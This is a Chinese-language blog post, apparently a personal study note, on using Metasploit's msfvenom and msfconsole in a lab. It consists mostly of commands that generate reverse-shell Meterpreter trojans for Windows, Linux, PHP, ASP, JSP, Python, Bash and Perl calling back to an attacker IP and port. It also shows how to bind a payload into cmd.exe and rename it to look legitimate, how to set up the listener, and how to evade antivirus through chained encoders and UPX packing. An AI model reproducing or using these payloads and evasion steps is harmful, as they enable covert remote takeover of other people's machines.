# MSF学习

之前的渗透测试中 其实很少用到 cs msf

但是在实际内网的时候 可以发现 msf cs 都是很好用的 所以现在我来学习一下 msf的使用方法

kali自带msf

 [https://www.cnblogs.com/bmjoker/p/10051014.html](https://www.cnblogs.com/bmjoker/p/10051014.html) 

使用

```undefined
msfconsole
```

启动即可

首先就是最正常的木马生成

所以这里其实只需要会木马生成

其他免杀什么的先不需要看

这里我们使用msfvenom

## 基本木马生成

```cobol
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.53.128 LPORT=5555 -f exe > shell.exe
```

这里记得修改ip 和端口

然后上传



<img src="https://i-blog.csdnimg.cn/blog_migrate/fd1d19c10922a6d5e6cdd59cad2af927.png" alt="" style="max-height:768px; box-sizing:content-box;" />


但是发现被杀了 我们先推出火绒 然后看看基本使用

这个时候我们需要打开msf

```css
exploit/multi/handler 这个是来监听的
 
set payload windows/meterpreter/reverse_tcp  设置反向监听payload
 
set lhost 192.168.53.128                          # 我们的kali本机ip
 
set lport 5555                                    # 我们的kali本机端口
 
run
```

然后我们在windows上执行木马



<img src="https://i-blog.csdnimg.cn/blog_migrate/a6a5b8eff9e2e8d142b04f5118769da4.png" alt="" style="max-height:320px; box-sizing:content-box;" />


获取到了控制权

## 捆绑程序木马生成

```css
msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.53.128 LPORT=5555 -x cmd.exe -f exe -o test_win10.exe
 
 
这里使用 -x 来捆绑一个可执行文件
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/3079fa9a3920a11a5b11834061204a46.png" alt="" style="max-height:319px; box-sizing:content-box;" />


当然需要将捆绑的引用放在目录下

然后我们修改一下名字



<img src="https://i-blog.csdnimg.cn/blog_migrate/74bc99499af4f848a70f38bcbf8e367a.png" alt="" style="max-height:172px; box-sizing:content-box;" />


是不是就很像

然后我们开始上线

## 木马生成其他

 **Linux：** 

```css
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf
```

 **Windows** :

```css
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe
```

 **PHP** :

```css
msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php
 
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
```

 **ASP** :

```css
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp > shell.asp
```

 **JSP** :

```css
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.jsp
```

 **Python** :

```css
msfvenom -p cmd/unix/reverse_python LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.py
```

 **Bash** :

```css
msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.sh
```

 **Perl** :

```css
msfvenom -p cmd/unix/reverse_perl LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.pl
```

## 基本免杀

```css
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.53.128  lport=5555 -e x86/shikata_ga_nai -i 20 -f raw | msfvenom -e x86/alpha_upper -a x86 --platform windows -i 5 -f raw | msfvenom -e x86/shikata_ga_nai -a x86 --platform windows -i 10 -f raw | msfvenom -e x86/countdown -a x86 --platform windows -i 10  -f exe -o shell.exe
```

```css
这里使用 -e 参数 
```

可以生成一个混淆的木马

然后我们再加壳

```css
upx shell.exe
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/d9e45caab2296cb471ecad56eeeb191e.png" alt="" style="max-height:544px; box-sizing:content-box;" />


无法绕过 因为这个只是一般的免杀 特征都被抓到了

这里我们开始使用自行编码

```css
msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 15 -b '\x00' lhost=192.168.53.128  lport=5555 -f c
```

-b 是删除指定的 字符串 然后 -f 是输出格式



<img src="https://i-blog.csdnimg.cn/blog_migrate/f611d63a188d02b9aec0cff17bae186f.png" alt="" style="max-height:494px; box-sizing:content-box;" />